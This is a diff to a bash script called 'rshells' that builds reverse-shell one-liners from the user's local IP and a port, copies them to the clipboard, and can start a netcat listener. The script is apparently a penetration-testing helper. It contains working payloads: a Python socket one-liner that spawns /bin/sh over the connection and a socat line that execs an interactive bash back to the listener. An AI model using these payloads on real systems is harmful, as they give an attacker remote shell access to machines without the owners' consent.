@@ -2,45 +2,54 @@
 
 # rshells - ya boi darkrain
 # Takes cmdline args
-# arg 1 is the port you want
-# arg 2 is the shell you want, you will be able to type the name that you want.
-# ./rshells.sh 31337 php
+# -p for port -s for shell and -l sets up a nc listener on that port
+# Default port is 443
 # To add more one liners, simply copy the format in the switch case below
 # variables to inject are $port and $ip
-# * You can also run the script without args and script will ask
 # you will need xclip for the clipboard access
 # sudo apt install xclip
 
+## FUNCTIONS ##
+function usage(){
+    echo -e "Usage: $0 [-p <port>] [-s <rshell \e[91m(required)\e[0m>] [-l run nc listener]"
+}
+
+## Dependancies ##
 command -v xclip >/dev/null 2>&1 || { echo >&2 "Please install xclip: sudo apt install xclip"; exit 1; }
 type xclip >/dev/null 2>&1 || { echo >&2 "Please install xclip: sudo apt install xclip"; exit 1; }
 hash xclip 2>/dev/null || { echo >&2 "Please install xclip: sudo apt install xclip"; exit 1; }
 
+# default variables
+port="443"
+listen=0
+shell="null"
+
+# Get args
+while getopts 'p:s:l' c
+do
+    case $c in
+        l) listen=1 ;;
+        p) port="$OPTARG" ;;
+        s) shell="$OPTARG" ;;
+        *)
+            usage
+            exit 2
+    esac
+done
+
+## Set options ##
 mynetip=$(hostname -I | tr -d '[:space:]')
 export mynetip
 
 if [ "$mynetip" = "127.0.0.1" ]
 then
     echo -e "\e[91mNo valid ip\e[0m"
-    exit 2
+    exit 3
 fi
 echo -e "\e[0;33m$mynetip\e[0m grabbed, stored, and exported as \e[0;33mmynetip\e[0m"
+ip="$mynetip"
 
-ip=$mynetip
-port=$1
-shell=$2
-
-if [ "$port" = "" ]
-then # Port not given, no args
-    echo -n "What port: "
-    read port
-    echo -n "What shell: "
-    read shell
-elif [ "$shell" = "" ]
-then # Shell not given, assume valid port
-    echo -n "What shell: "
-    read shell
-fi
-
+## Shell Copy ##
 case $shell in
 'python') # Done
 	echo -n "python -c '''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('"$ip"',"$port"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'''" | xclip -selection clipboard
@@ -84,9 +93,16 @@ case $shell in
         echo -n '> socat tcp-connect:'$ip':'$port' exec:"bash -li",pty,stderr,setsid,sigint,sane' | xclip -selection clipboard
         echo -e "\e[32mSocat Shell Copied\e[0m"
         ;;
-
-
 *) # Case for not finding anything
 	echo -e "\e[91mDid not copy anything\e[0m"
+    listen=0
 	;;
 esac
+
+
+## Optional Listener ##
+if test $listen -eq 1
+then
+    echo "Setting up listener on $port..."
+    sudo nc -lvnp "$port"
+fi
